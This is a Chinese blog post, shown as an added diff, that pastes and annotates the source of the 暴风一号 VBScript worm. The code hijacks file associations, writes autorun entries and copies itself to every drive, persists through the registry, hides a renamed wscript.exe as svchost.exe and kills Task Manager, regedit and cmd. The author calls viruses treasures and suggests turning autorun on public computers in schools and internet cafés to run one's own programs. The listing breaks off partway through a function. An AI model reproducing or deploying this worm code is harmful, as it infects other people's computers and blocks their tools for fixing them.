@@ -1,0 +1,2061 @@
+<article class="border rounded p-3">
+ <h1 class="pt-3 pb-4 article-title">
+  从暴风一号病毒源码里面找到的宝贝
+ </h1>
+ <div class="aio-h5 text-muted article-info">
+  <ul class="d-flex flex-wrap aio-list-split-dot">
+   <a href="https://mrxn.net/author/1">
+    Mrxn
+   </a>
+   <li>
+    发表于2014/12/4 15:19
+   </li>
+   <li>
+    10235浏览
+   </li>
+   <li>
+    <a href="#comment" target="_self">
+     0评论
+    </a>
+   </li>
+   <li>
+    <span class="text-bold">
+     6小时
+    </span>
+    阅读
+   </li>
+   <li>
+   </li>
+  </ul>
+ </div>
+ <div style="max-width: 790px;">
+  <script async="" crossorigin="anonymous" src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-3202499379713676">
+  </script>
+  <ins class="adsbygoogle" data-ad-client="ca-pub-3202499379713676" data-ad-format="fluid" data-ad-layout="in-article" data-ad-slot="2223359147" style="display:block; text-align:center;">
+  </ins>
+  <script>
+   (adsbygoogle = window.adsbygoogle || []).push({});
+  </script>
+ </div>
+ <hr class="my-3"/>
+ <div class="line-numbers my-3 article-content markdown">
+  <p style='font:12px/18px "sans serif", tahoma, verdana, helvetica;margin:5px 0px;color:#000000;text-transform:none;text-indent:2em;letter-spacing:normal;word-spacing:0px;white-space:normal;-ms-word-wrap:break-word;-webkit-text-stroke-width:0px;'>
+   <span style='font-family:"Microsoft YaHei";font-size:16px;'>
+    今天和朋友聊天中，聊到HTA，说让我学习一下，我就去百度搜素了一下，就在搜索结果中发现了暴风一号病毒，由于对病毒感兴趣，就点击进去了，看了它的介绍和威力，就估摸着下载一份源码来看看，于是Download......以下是我在源码中发现的好东西：
+   </span>
+  </p>
+  <p style='font:12px/18px "sans serif", tahoma, verdana, helvetica;margin:5px 0px;color:#000000;text-transform:none;text-indent:2em;letter-spacing:normal;word-spacing:0px;white-space:normal;-ms-word-wrap:break-word;-webkit-text-stroke-width:0px;'>
+   <span style='font-family:"Microsoft YaHei";font-size:16px;'>
+    1.病毒会删除HKCR\lnkfile\IsShortcut键值，使快捷方式的图标上叠加的小箭头
+    <img alt="从暴风一号病毒源码里面找到的宝贝" border="0" src="https://mrxn.net/content/uploadfile/201504/7c6aa1e2c231de32ea08d99bd4ae7e4420150418131013.png" style="border:0px currentColor;border-image:none;"/>
+    消失。
+   </span>
+  </p>
+  <p style='font:12px/18px "sans serif", tahoma, verdana, helvetica;margin:5px 0px;color:#000000;text-transform:none;text-indent:2em;letter-spacing:normal;word-spacing:0px;white-space:normal;-ms-word-wrap:break-word;-webkit-text-stroke-width:0px;'>
+   <span style='font-family:"Microsoft YaHei";font-size:16px;'>
+    <a href="https://mrxn.net/" target="_blank">
+     博主
+    </a>
+    亲测效果图：
+    <br/>
+   </span>
+  </p>
+  <p style='font:12px/18px "sans serif", tahoma, verdana, helvetica;margin:5px 0px;color:#000000;text-transform:none;text-indent:0px;letter-spacing:normal;word-spacing:0px;white-space:normal;-ms-word-wrap:break-word;-webkit-text-stroke-width:0px;'>
+   <span style='font-family:"Microsoft YaHei";font-size:16px;'>
+    <a href="https://mrxn.net/content/uploadfile/201412/24341417681772.jpg" id="ematt:534" target="_blank">
+     <span class="Apple-converted-space">
+     </span>
+     <img alt="2014-000055.jpg" border="0" height="460" src="https://mrxn.net/content/uploadfile/201504/1460573d39b2bf549a800882b0c2aecc20150418131017.jpg" style="border:0px currentColor;border-image:none;" title="点击查看原图" width="138"/>
+     <span class="Apple-converted-space">
+     </span>
+    </a>
+    <a href="https://mrxn.net/content/uploadfile/201412/756c1417682388.jpg" id="ematt:538" target="_blank">
+     <img alt="2014-000057.jpg" border="0" height="119" src="https://mrxn.net/content/uploadfile/201504/8420a539c6488b967b4bbc5fb1452d5f20150418131018.jpg" style="border:0px currentColor;border-image:none;" title="点击查看原图" width="420"/>
+    </a>
+    <br/>
+   </span>
+  </p>
+  <p style='font:12px/18px "sans serif", tahoma, verdana, helvetica;margin:5px 0px;color:#000000;text-transform:none;text-indent:0px;letter-spacing:normal;word-spacing:0px;white-space:normal;-ms-word-wrap:break-word;-webkit-text-stroke-width:0px;'>
+   <span style='font-family:"Microsoft YaHei";font-size:16px;'>
+    看起来爽很多是不是！你也可以，删除上图中→_→右边黄色的
+    <span style='font-family:"Microsoft YaHei";font-size:16px;'>
+     IsShortcut
+    </span>
+    项 。重启电脑即可看到效果。^_^
+   </span>
+  </p>
+  <p style='font:12px/18px "sans serif", tahoma, verdana, helvetica;margin:5px 0px;color:#000000;text-transform:none;text-indent:0px;letter-spacing:normal;word-spacing:0px;white-space:normal;-ms-word-wrap:break-word;-webkit-text-stroke-width:0px;'>
+   <span style='font-family:"Microsoft YaHei";font-size:16px;'>
+    <span style='font-family:"Microsoft YaHei";font-size:16px;'>
+     <a href="https://mrxn.net/content/uploadfile/201412/47c61417682242.jpg" id="ematt:536" target="_blank">
+      <img alt="2014-000056.jpg" border="0" height="131" src="https://mrxn.net/content/uploadfile/201504/4551748682e0016cc2a4553f07ec6a0120150418131020.jpg" style="border:0px currentColor;border-image:none;" title="点击查看原图" width="420"/>
+     </a>
+    </span>
+    -------这是源码部分截图
+    <br/>
+   </span>
+  </p>
+  <p style='font:12px/18px "sans serif", tahoma, verdana, helvetica;margin:5px 0px;color:#000000;text-transform:none;text-indent:0px;letter-spacing:normal;word-spacing:0px;white-space:normal;-ms-word-wrap:break-word;-webkit-text-stroke-width:0px;'>
+   <span style='font-family:"Microsoft YaHei";font-size:16px;'>
+    2.修改inf,bat,cmd,reg,chm,hlp,txt文件关联：
+   </span>
+  </p>
+  <p style='font:12px/18px "sans serif", tahoma, verdana, helvetica;margin:5px 0px;color:#000000;text-transform:none;text-indent:0px;letter-spacing:normal;word-spacing:0px;white-space:normal;-ms-word-wrap:break-word;-webkit-text-stroke-width:0px;'>
+   <span style='font-family:"Microsoft YaHei";font-size:16px;'>
+   </span>
+  </p>
+  <pre class="prettyprint lang-vb linenums" style="color:#000000;text-transform:none;line-height:18px;text-indent:0px;letter-spacing:normal;font-size:12px;font-style:normal;font-variant:normal;font-weight:normal;word-spacing:0px;-webkit-text-stroke-width:0px;"> If ReadReg("HKEY_LOCAL_MACHINE/SOFTWARE/Classes/cmdfile/shell/open/command/")&lt;&gt;File_Value Then
+        Call SetCmdFileAss(VirusAssPath)
+    End If
+    If ReadReg("HKEY_LOCAL_MACHINE/SOFTWARE/Classes/regfile/shell/open/command/")&lt;&gt;File_Value Then
+        Call SetRegFileAss(VirusAssPath)
+    End If
+    If ReadReg("HKEY_LOCAL_MACHINE/SOFTWARE/Classes/chm.file/shell/open/command/")&lt;&gt;File_Value Then
+        Call SetchmFileAss(VirusAssPath)
+    End If
+    If ReadReg("HKEY_LOCAL_MACHINE/SOFTWARE/Classes/hlpfile/shell/open/command/")&lt;&gt;File_Value Then
+        Call SethlpFileAss(VirusAssPath)
+    End If <a href="https://mrxn.net/content/uploadfile/201412/c8b51417683284.jpg" id="ematt:540" target="_blank"><img alt="2014-000058.jpg" border="0" height="145" src="https://mrxn.net/content/uploadfile/201504/6ee03edb8ea4afbcdca6d777b81004dc20150418131022.jpg" style="border:0px currentColor;border-image:none;" title="点击查看原图" width="420"/></a> </pre>
+  <p style='font:12px/18px "sans serif", tahoma, verdana, helvetica;margin:5px 0px;color:#000000;text-transform:none;text-indent:0px;letter-spacing:normal;word-spacing:0px;white-space:normal;-ms-word-wrap:break-word;-webkit-text-stroke-width:0px;'>
+   至于这个嘛，我们可以用来修复文件关联错误。比如有时候我们打开EXE或者是上面的
+   <span style='font-family:"Microsoft YaHei";font-size:16px;'>
+    inf,bat,cmd,reg,chm,hlp,txt
+   </span>
+   <span class="Apple-converted-space">
+   </span>
+   ，
+  </p>
+  <p style='font:12px/18px "sans serif", tahoma, verdana, helvetica;margin:5px 0px;color:#000000;text-transform:none;text-indent:0px;letter-spacing:normal;word-spacing:0px;white-space:normal;-ms-word-wrap:break-word;-webkit-text-stroke-width:0px;'>
+   <br/>
+  </p>
+  <p style='font:12px/18px "sans serif", tahoma, verdana, helvetica;margin:5px 0px;color:#000000;text-transform:none;text-indent:0px;letter-spacing:normal;word-spacing:0px;white-space:normal;-ms-word-wrap:break-word;-webkit-text-stroke-width:0px;'>
+   <span style='font-family:"Microsoft YaHei";font-size:16px;'>
+    当然你也可以用来关联你想关联的。嘿嘿   自由发挥！
+    <br/>
+   </span>
+  </p>
+  <p style='font:12px/18px "sans serif", tahoma, verdana, helvetica;margin:5px 0px;color:#000000;text-transform:none;text-indent:0px;letter-spacing:normal;word-spacing:0px;white-space:normal;-ms-word-wrap:break-word;-webkit-text-stroke-width:0px;'>
+   <span style='font-family:"Microsoft YaHei";font-size:16px;'>
+    3.开启所有磁盘的自动运行特性：
+   </span>
+  </p>
+  <p style='font:12px/18px "sans serif", tahoma, verdana, helvetica;margin:5px 0px;color:#000000;text-transform:none;text-indent:0px;letter-spacing:normal;word-spacing:0px;white-space:normal;-ms-word-wrap:break-word;-webkit-text-stroke-width:0px;'>
+   <span style='font-family:"Microsoft YaHei";font-size:16px;'>
+   </span>
+  </p>
+  <pre class="prettyprint lang-vb linenums" style="color:#000000;text-transform:none;line-height:18px;text-indent:0px;letter-spacing:normal;font-size:12px;font-style:normal;font-variant:normal;font-weight:normal;word-spacing:0px;-webkit-text-stroke-width:0px;">Sub RegSet()
+    On Error Resume Next
+    Dim RegPath1 , RegPath2, RegPath3, RegPath4
+    RegPath1="HKEY_LOCAL_MACHINE/SOFTWARE/Microsoft/Windows/CurrentVersion/Explorer/Advanced/Folder/Hidden/NOHIDDEN/CheckedValue"
+    RegPath2="HKEY_LOCAL_MACHINE/SOFTWARE/Microsoft/Windows/CurrentVersion/Explorer/Advanced/Folder/Hidden/SHOWALL/CheckedValue"
+    RegPath3="HKEY_CURRENT_USER/Software/Microsoft/Windows/CurrentVersion/Policies/Explorer/NoDriveTypeAutoRun"
+    RegPath4="HKEY_CLASSES_ROOT/lnkfile/IsShortcut"
+    Call WriteReg (RegPath1, 3, "REG_DWORD")
+    Call WriteReg (RegPath2, 2, "REG_DWORD")
+    Call WriteReg (RegPath3, 0, "REG_DWORD")
+    Call DeleteReg (RegPath4)
+End Sub <a href="https://mrxn.net/content/uploadfile/201412/eb3f1417683301.jpg" id="ematt:542" target="_blank"><img alt="2014-000059.jpg" border="0" height="51" src="https://mrxn.net/content/uploadfile/201504/e97ac32334a0928d97f8db40b69598cd20150418131024.jpg" style="border:0px currentColor;border-image:none;" title="点击查看原图" width="420"/></a> </pre>
+  <p style='font:12px/18px "sans serif", tahoma, verdana, helvetica;margin:5px 0px;color:#000000;text-transform:none;text-indent:0px;letter-spacing:normal;word-spacing:0px;white-space:normal;-ms-word-wrap:break-word;-webkit-text-stroke-width:0px;'>
+   这个我们可以利用啊！特别是对于网吧，学校这种公共场所的电脑，让它自动运行你的软甲你。O(∩_∩)O哈哈~
+  </p>
+  <p style='font:12px/18px "sans serif", tahoma, verdana, helvetica;margin:5px 0px;color:#000000;text-transform:none;text-indent:0px;letter-spacing:normal;word-spacing:0px;white-space:normal;-ms-word-wrap:break-word;-webkit-text-stroke-width:0px;'>
+   <br/>
+  </p>
+  <p style='font:12px/18px "sans serif", tahoma, verdana, helvetica;margin:5px 0px;color:#000000;text-transform:none;text-indent:0px;letter-spacing:normal;word-spacing:0px;white-space:normal;-ms-word-wrap:break-word;-webkit-text-stroke-width:0px;'>
+   <span style='font-family:"Microsoft YaHei";font-size:16px;'>
+    算了不说了，估计很多看客就知道第一种 修改桌面图图标上的小鼠标吧！
+   </span>
+  </p>
+  <p style='font:12px/18px "sans serif", tahoma, verdana, helvetica;margin:5px 0px;color:#000000;text-transform:none;text-indent:0px;letter-spacing:normal;word-spacing:0px;white-space:normal;-ms-word-wrap:break-word;-webkit-text-stroke-width:0px;'>
+   <span style='font-family:"Microsoft YaHei";font-size:16px;'>
+    <span style="font-size:18px;">
+     下面贴出真个病毒的源代码加注释：需要的自行研究，
+     <strong>
+      病毒都是宝贝啊，都是编程中的精品！
+     </strong>
+    </span>
+   </span>
+  </p>
+  <p>
+   <span style='font-family:"Microsoft YaHei";font-size:16px;'>
+    <span style="font-size:18px;">
+     <strong>
+     </strong>
+    </span>
+   </span>
+  </p>
+  <table border="1" bordercolor="#000000" cellpadding="2" cellspacing="0" height="11161" style="border-collapse:collapse;" width="986">
+   <tbody>
+    <tr>
+     <td style='font:12px/1.5 "sans serif", tahoma, verdana, helvetica;'>
+      On Error Resume Next '//屏蔽出错信息，发生错误时继续向下执行
+      <br/>
+      Dim Fso,WshShell '//定义了两个变量
+      <br/>
+      <br/>
+      '//创建并返回对 Automation 对象的引用。
+      <br/>
+      '//CreateObject(servername.typename [, location])
+      <br/>
+      '//servername 必选项。提供对象的应用程序名称。
+      <br/>
+      '//typename 必选项。要创建的对象类型或类。
+      <br/>
+      '//location 可选项。对象所在的网络服务器将被创建。
+      <br/>
+      '//说明Automation 服务器至少提供一种对象类型。例如，字处理应用程序可以提供应用程序对象、文档对象和工具条对象。
+      <br/>
+      <br/>
+      Set Fso=CreateObject("scRiPTinG.fiLEsysTeMoBjEcT") '//为变量Fso赋值 创建 Scripting.FileSystemObject 对象 提供对计算机文件系统的访问
+      <br/>
+      Set WshShell=CreateObject("wScRipT.SHelL") '//为变量WshShell赋值 创建Wscript.Shell对象 用于获取系统环境变量的访问、创建快捷方式、访问Windows的特殊文件夹，
+      <br/>
+      '//以及添加或删除注册表条目。还可以使用Shell对象的功能创建更多的定制对话框以进行用户交互。
+      <br/>
+      Call Main() '//call 将控制权传递到sub或function
+      <br/>
+      Sub Main() '//sub、function 两种表示方法 sub没有返回值，function有返回值
+      <br/>
+      On Error Resume Next
+      <br/>
+      Dim Args, VirusLoad, VirusAss
+      <br/>
+      Set Args=WScript.Arguments '//返回wsh对象的参数集
+      <br/>
+      VirusLoad=GetMainVirus(1)  '//获得System文件夹下smss.exe 蠕虫地址
+      <br/>
+      VirusAss=GetMainVirus(0)   '//获得Windows文件夹下explorer.exe 蠕虫地址
+      <br/>
+      ArgNum=0
+      <br/>
+      <br/>
+      Do While ArgNum &lt; Args.Count
+      <br/>
+      Param=Param&amp;" "&amp;Args(ArgNum)
+      <br/>
+      ArgNum=ArgNum + 1
+      <br/>
+      Loop
+      <br/>
+      SubParam=LCase(Right(Param, 3)) '//LCase 返回字符串的小写形式 Right 从字符串右边返回指定数目的字符
+      <br/>
+      <br/>
+      Select Case SubParam '//select类似switch
+      <br/>
+      Case "run" '//当运行run时，同时启动病毒文件
+      <br/>
+      RunPath=Left(WScript.ScriptFullName, 2) '//ScriptFullName属性返回当前正在运行的脚本的完整路径。该属性返回一个只读的字符串。
+      <br/>
+      Call Run(RunPath)
+      <br/>
+      Call InvadeSystem(VirusLoad,VirusAss)
+      <br/>
+      Call Run("%SystemRoot%/system/svchost.exe "&amp;VirusLoad)
+      <br/>
+      <br/>
+      Case "txt", "log","ini" ,"inf" '//运行"txt", "log", "ini", "inf"后缀名文件时，同时启动病毒文件
+      <br/>
+      RunPath="%SystemRoot%/system32/NOTEPAD.EXE "&amp;Param
+      <br/>
+      Call Run(RunPath)
+      <br/>
+      Call InvadeSystem(VirusLoad,VirusAss)
+      <br/>
+      Call Run("%SystemRoot%/system/svchost.exe "&amp;VirusLoad)
+      <br/>
+      <br/>
+      Case "bat", "cmd" '//运行"bat", "cmd"批处理或命令提示符时，同时启动病毒文件
+      <br/>
+      RunPath="CMD /c echo Hi!I'm here!&amp;pause"
+      <br/>
+      Call Run(RunPath)
+      <br/>
+      Call InvadeSystem(VirusLoad,VirusAss)
+      <br/>
+      Call Run("%SystemRoot%/system/svchost.exe "&amp;VirusLoad)
+      <br/>
+      <br/>
+      Case "reg" '//运行"reg"注册表导入程序时，同时启动病毒文件
+      <br/>
+      RunPath="regedit.exe "&amp;""""&amp;Trim(Param)&amp;""""
+      <br/>
+      Call Run(RunPath)
+      <br/>
+      Call InvadeSystem(VirusLoad,VirusAss)
+      <br/>
+      Call Run("%SystemRoot%/system/svchost.exe "&amp;VirusLoad)
+      <br/>
+      <br/>
+      Case "chm" '//运行"chm"帮助文件时，同时启动病毒文件
+      <br/>
+      RunPath="hh.exe "&amp;""""&amp;Trim(Param)&amp;""""
+      <br/>
+      Call Run(RunPath)
+      <br/>
+      Call InvadeSystem(VirusLoad,VirusAss)
+      <br/>
+      Call Run("%SystemRoot%/system/svchost.exe "&amp;VirusLoad)
+      <br/>
+      <br/>
+      Case "hlp" '//运行"hlp"帮助文件时，同时启动病毒文件
+      <br/>
+      RunPath="winhlp32.exe "&amp;""""&amp;Trim(Param)&amp;""""
+      <br/>
+      Call Run(RunPath)
+      <br/>
+      Call InvadeSystem(VirusLoad,VirusAss)
+      <br/>
+      Call Run("%SystemRoot%/system/svchost.exe "&amp;VirusLoad)
+      <br/>
+      <br/>
+      Case "dir" '//运行dir命令，同时启动病毒文件
+      <br/>
+      RunPath=""""&amp;Left(Trim(Param),Len(Trim(Param))-3)&amp;""""
+      <br/>
+      Call Run(RunPath)
+      <br/>
+      Call InvadeSystem(VirusLoad,VirusAss)
+      <br/>
+      Call Run("%SystemRoot%/system/svchost.exe "&amp;VirusLoad)
+      <br/>
+      <br/>
+      Case "oie" '//打开我IE图标，同时启动病毒文件
+      <br/>
+      RunPath="""%ProgramFiles%/Internet Explorer/IEXPLORE.EXE"""
+      <br/>
+      Call Run(RunPath)
+      <br/>
+      Call InvadeSystem(VirusLoad,VirusAss)
+      <br/>
+      Call Run("%SystemRoot%/system/svchost.exe "&amp;VirusLoad)
+      <br/>
+      <br/>
+      Case "omc" '//打开我的电脑图标，同时启动病毒文件
+      <br/>
+      RunPath="explorer.exe /n,::{20D04FE0-3AEA-1069-A2D8-08002B30309D}"
+      <br/>
+      Call Run(RunPath)
+      <br/>
+      Call InvadeSystem(VirusLoad,VirusAss)
+      <br/>
+      Call Run("%SystemRoot%/system/svchost.exe "&amp;VirusLoad)
+      <br/>
+      <br/>
+      Case "emc" '//劫持Win+E
+      <br/>
+      RunPath="explorer.exe /n,/e,::{20D04FE0-3AEA-1069-A2D8-08002B30309D}"
+      <br/>
+      Call Run(RunPath)
+      <br/>
+      Call InvadeSystem(VirusLoad,VirusAss)
+      <br/>
+      Call Run("%SystemRoot%/system/svchost.exe "&amp;VirusLoad)
+      <br/>
+      <br/>
+      Case Else
+      <br/>
+      If PreDblInstance=True Then '//如果条件满足，退出脚本宿主
+      <br/>
+      WScript.Quit
+      <br/>
+      End If
+      <br/>
+      Timeout = Datediff("ww", GetInfectedDate, Date) - 12
+      <br/>
+      If Timeout&gt;0 And Month(Date) = Day(Date) Then
+      <br/>
+      Call VirusAlert()
+      <br/>
+      Call MakeJoke(CInt(Month(Date)))
+      <br/>
+      End If
+      <br/>
+      Call MonitorSystem()
+      <br/>
+      <br/>
+      End Select
+      <br/>
+      End Sub
+      <br/>
+      <br/>
+      '//监视系统 结束taskmgr.exe、regedit.exe、msconfig.exe、cmd.exe
+      <br/>
+      Sub MonitorSystem()
+      <br/>
+      On Error Resume Next
+      <br/>
+      Dim ProcessNames, ExeFullNames
+      <br/>
+      ProcessNames=Array("cmd.exe","cmd.com","regedit.exe","regedit.scr","regedit.pif","regedit.com","msconfig.exe")
+      <br/>
+      VBSFullNames=Array(GetMainVirus(1)) '//变量赋值
+      <br/>
+      Do
+      <br/>
+      Call KillProcess(ProcessNames) '//如发现变量中的进程，调用结束进程函数
+      <br/>
+      Call InvadeSystem(GetMainVirus(1),GetMainVirus(0)) '// smss.exe 蠕虫地址 explorer.exe 蠕虫地址
+      <br/>
+      Call KeepProcess(VBSFullNames) '//保持病毒进程
+      <br/>
+      WScript.Sleep 3000 '//脚本宿主等待时间为3000毫秒=3秒
+      <br/>
+      Loop
+      <br/>
+      End Sub
+      <br/>
+      <br/>
+      '//侵入系统
+      <br/>
+      Sub InvadeSystem(VirusLoadPath,VirusAssPath)
+      <br/>
+      On Error Resume Next
+      <br/>
+      Dim Load_Value, File_Value, IE_Value, MyCpt_Value1, MyCpt_Value2, HCULoad, HCUVer, VirusCode, Version
+      <br/>
+      Load_Value=""""&amp;VirusLoadPath&amp;"""" '//smss.exe的病毒流
+      <br/>
+      File_Value="%SystemRoot%/System32/WScript.exe "&amp;""""&amp;VirusAssPath&amp;""""&amp;" %1 %* " '// explorer.exe 蠕虫
+      <br/>
+      IE_Value="%SystemRoot%/System32/WScript.exe "&amp;""""&amp;VirusAssPath&amp;""""&amp;" OIE " '// 打开ie 蠕虫
+      <br/>
+      MyCpt_Value1="%SystemRoot%/System32/WScript.exe "&amp;""""&amp;VirusAssPath&amp;""""&amp;" OMC " '//打开我的电脑 蠕虫
+      <br/>
+      MyCpt_Value2="%SystemRoot%/System32/WScript.exe "&amp;""""&amp;VirusAssPath&amp;""""&amp;" EMC " '//劫持Win+E 蠕虫
+      <br/>
+      HCULoad="HKEY_CURRENT_USER/SoftWare/Microsoft/Windows NT/CurrentVersion/Windows/Load"
+      <br/>
+      HCUVer="HKEY_CURRENT_USER/SoftWare/Microsoft/Windows NT/CurrentVersion/Windows/Ver"
+      <br/>
+      HCUDate="HKEY_CURRENT_USER/SoftWare/Microsoft/Windows NT/CurrentVersion/Windows/Date"
+      <br/>
+      VirusCode=GetCode(WScript.ScriptFullName)
+      <br/>
+      Version=1
+      <br/>
+      HostSourcePath=Fso.GetSpecialFolder(1)&amp;"/Wscript.exe"
+      <br/>
+      HostFilePath=Fso.GetSpecialFolder(0)&amp;"/system/svchost.exe"
+      <br/>
+      <br/>
+      For Each Drive In Fso.Drives '//分别建立各个目录的病毒名字
+      <br/>
+      If Drive.IsReady and (Drive.DriveType=1 Or Drive.DriveType=2 Or Drive.DriveType=3) Then
+      <br/>
+      DiskVirusName=GetSerialNumber(Drive.DriveLetter)&amp;".vbs"
+      <br/>
+      Call CreateAutoRun(Drive.DriveLetter,DiskVirusName) '//创建自动运行
+      <br/>
+      Call InfectRoot(Drive.DriveLetter,DiskVirusName) '//感染
+      <br/>
+      End If
+      <br/>
+      Next
+      <br/>
+      <br/>
+      If FSO.FileExists(VirusAssPath)=False Or FSO.FileExists(VirusLoadPath)=False Or FSO.FileExists(HostFilePath)=False Or GetVersion()&lt; Version Then
+      <br/>
+      If GetFileSystemType(GetSystemDrive())="NTFS" Then '//判断是否为NTFS分区
+      <br/>
+      Call CreateFile(VirusCode,VirusAssPath)
+      <br/>
+      Call CreateFile(VirusCode,VirusLoadPath) '//这一步创建了流文件
+      <br/>
+      Call CopyFile(HostSourcePath,HostFilePath) '//这一步将wscript.exe从system32复制到system目录并改名svchost.exe
+      <br/>
+      Call SetHiddenAttr(HostFilePath)
+      <br/>
+      Else '//FAT32格式
+      <br/>
+      Call CreateFile(VirusCode, VirusAssPath)
+      <br/>
+      Call SetHiddenAttr(VirusAssPath)
+      <br/>
+      Call CreateFile(VirusCode,VirusLoadPath)
+      <br/>
+      Call SetHiddenAttr(VirusLoadPath)
+      <br/>
+      Call CopyFile(HostSourcePath, HostFilePath)
+      <br/>
+      Call SetHiddenAttr(HostFilePath)
+      <br/>
+      End If
+      <br/>
+      End If
+      <br/>
+      <br/>
+      If ReadReg(HCULoad)&lt;&gt;Load_Value  Then  '//改写注册表启动项，smss.exe的流
+      <br/>
+      Call WriteReg (HCULoad, Load_Value, "")
+      <br/>
+      End If
+      <br/>
+      <br/>
+      If GetVersion() &lt; Version Then   '//改写版本信息为1
+      <br/>
+      Call WriteReg (HCUVer, Version, "")
+      <br/>
+      End If
+      <br/>
+      <br/>
+      If GetInfectedDate() = "" Then
+      <br/>
+      Call WriteReg (HCUDate, Date, "")  '//记录感染时间
+      <br/>
+      End If
+      <br/>
+      <br/>
+      '//以下更改许多文件关联,病毒的通用感染方式
+      <br/>
+      If ReadReg("HKEY_LOCAL_MACHINE/SOFTWARE/Classes/txtfile/shell/open/command/")&lt;&gt;File_Value Then
+      <br/>
+      Call SetTxtFileAss(VirusAssPath)
+      <br/>
+      End If
+      <br/>
+      <br/>
+      If ReadReg("HKEY_LOCAL_MACHINE/SOFTWARE/Classes/inifile/shell/open/command/")&lt;&gt;File_Value Then
+      <br/>
+      Call SetIniFileAss(VirusAssPath)
+      <br/>
+      End If
+      <br/>
+      <br/>
+      If ReadReg("HKEY_LOCAL_MACHINE/SOFTWARE/Classes/inffile/shell/open/command/")&lt;&gt;File_Value Then
+      <br/>
+      Call SetInfFileAss(VirusAssPath)
+      <br/>
+      End If
+      <br/>
+      <br/>
+      If ReadReg("HKEY_LOCAL_MACHINE/SOFTWARE/Classes/batfile/shell/open/command/")&lt;&gt;File_Value Then
+      <br/>
+      Call SetBatFileAss(VirusAssPath)
+      <br/>
+      End If
+      <br/>
+      <br/>
+      If ReadReg("HKEY_LOCAL_MACHINE/SOFTWARE/Classes/cmdfile/shell/open/command/")&lt;&gt;File_Value Then
+      <br/>
+      Call SetCmdFileAss(VirusAssPath)
+      <br/>
+      End If
+      <br/>
+      <br/>
+      If ReadReg("HKEY_LOCAL_MACHINE/SOFTWARE/Classes/regfile/shell/open/command/")&lt;&gt;File_Value Then
+      <br/>
+      Call SetRegFileAss(VirusAssPath)
+      <br/>
+      End If
+      <br/>
+      <br/>
+      If ReadReg("HKEY_LOCAL_MACHINE/SOFTWARE/Classes/chm.file/shell/open/command/")&lt;&gt;File_Value Then
+      <br/>
+      Call SetchmFileAss(VirusAssPath)
+      <br/>
+      End If
+      <br/>
+      <br/>
+      If ReadReg("HKEY_LOCAL_MACHINE/SOFTWARE/Classes/hlpfile/shell/open/command/")&lt;&gt;File_Value Then
+      <br/>
+      Call SethlpFileAss(VirusAssPath)
+      <br/>
+      End If
+      <br/>
+      <br/>
+      If ReadReg("HKEY_LOCAL_MACHINE/SOFTWARE/Classes/Applications/iexplore.exe/shell/open/command/")&lt;&gt;IE_Value Then
+      <br/>
+      Call SetIEAss(VirusAssPath)
+      <br/>
+      End If
+      <br/>
+      <br/>
+      If ReadReg("HKEY_CLASSES_ROOT/CLSID/{871C5380-42A0-1069-A2EA-08002B30309D}/shell/OpenHomePage/Command/")&lt;&gt;IE_Value Then
+      <br/>
+      Call SetIEAss(VirusAssPath)
+      <br/>
+      End If
+      <br/>
+      <br/>
+      If ReadReg("HKEY_CLASSES_ROOT/CLSID/{20D04FE0-3AEA-1069-A2D8-08002B30309D}/shell/open/command/")&lt;&gt;MyCpt_Value1 Then
+      <br/>
+      Call SetMyComputerAss(VirusAssPath)
+      <br/>
+      End If
+      <br/>
+      <br/>
+      If ReadReg("HKEY_CLASSES_ROOT/CLSID/{20D04FE0-3AEA-1069-A2D8-08002B30309D}/shell/explore/command/")&lt;&gt;MyCpt_Value2 Then
+      <br/>
+      Call SetMyComputerAss(VirusAssPath)
+      <br/>
+      End If
+      <br/>
+      <br/>
+      Call RegSet()
+      <br/>
+      End Sub
+      <br/>
+      <br/>
+      '//拷贝文件
+      <br/>
+      Sub CopyFile(source, pathf)
+      <br/>
+      On Error Resume Next
+      <br/>
+      If FSO.FileExists(pathf) Then
+      <br/>
+      FSO.DeleteFile pathf , True
+      <br/>
+      End If
+      <br/>
+      FSO.CopyFile source, pathf
+      <br/>
+      End Sub
+      <br/>
+      <br/>
+      '//创建文件
+      <br/>
+      Sub CreateFile(code, pathf)
+      <br/>
+      On Error Resume Next
+      <br/>
+      Dim FileText
+      <br/>
+      If FSO.FileExists(pathf) Then
+      <br/>
+      Set FileText=FSO.OpenTextFile(pathf, 2, False)
+      <br/>
+      FileText.Write code
+      <br/>
+      FileText.Close
+      <br/>
+      Else
+      <br/>
+      Set FileText=FSO.OpenTextFile(pathf, 2, True)
+      <br/>
+      FileText.Write code
+      <br/>
+      FileText.Close
+      <br/>
+      End If
+      <br/>
+      End Sub
+      <br/>
+      <br/>
+      '//注册表设置
+      <br/>
+      Sub RegSet()
+      <br/>
+      On Error Resume Next
+      <br/>
+      Dim RegPath1 , RegPath2, RegPath3, RegPath4
+      <br/>
+      RegPath1="HKEY_LOCAL_MACHINE/SOFTWARE/Microsoft/Windows/CurrentVersion/Explorer/Advanced/Folder/Hidden/NOHIDDEN/CheckedValue"
+      <br/>
+      RegPath2="HKEY_LOCAL_MACHINE/SOFTWARE/Microsoft/Windows/CurrentVersion/Explorer/Advanced/Folder/Hidden/SHOWALL/CheckedValue"
+      <br/>
+      RegPath3="HKEY_CURRENT_USER/Software/Microsoft/Windows/CurrentVersion/Policies/Explorer/NoDriveTypeAutoRun"
+      <br/>
+      RegPath4="HKEY_CLASSES_ROOT/lnkfile/IsShortcut"
+      <br/>
+      Call WriteReg (RegPath1, 3, "REG_DWORD")
+      <br/>
+      Call WriteReg (RegPath2, 2, "REG_DWORD")
+      <br/>
+      Call WriteReg (RegPath3, 0, "REG_DWORD")
+      <br/>
+      Call DeleteReg (RegPath4)
+      <br/>
+      End Sub
+      <br/>
+      <br/>
+      '//结束进程
+      <br/>
+      Sub KillProcess(ProcessNames)
+      <br/>
+      On Error Resume Next
+      <br/>
+      Set WMIService=GetObject("winmgmts://./root/cimv2")
+      <br/>
+      For Each ProcessName in ProcessNames
+      <br/>
+      Set ProcessList=WMIService.execquery(" Select * From win32_process where name ='"&amp;ProcessName&amp;"' ")
+      <br/>
+      For Each Process in ProcessList
+      <br/>
+      IntReturn=Process.terminate
+      <br/>
+      If intReturn&lt;&gt;0 Then
+      <br/>
+      WshShell.Run "CMD /c ntsd -c q -p "&amp;Process.Handle, vbHide, False
+      <br/>
+      End If
+      <br/>
+      Next
+      <br/>
+      Next
+      <br/>
+      End Sub
+      <br/>
+      <br/>
+      '//删掉autorun.inf免疫目录
+      <br/>
+      Sub KillImmunity(D)
+      <br/>
+      On Error Resume Next
+      <br/>
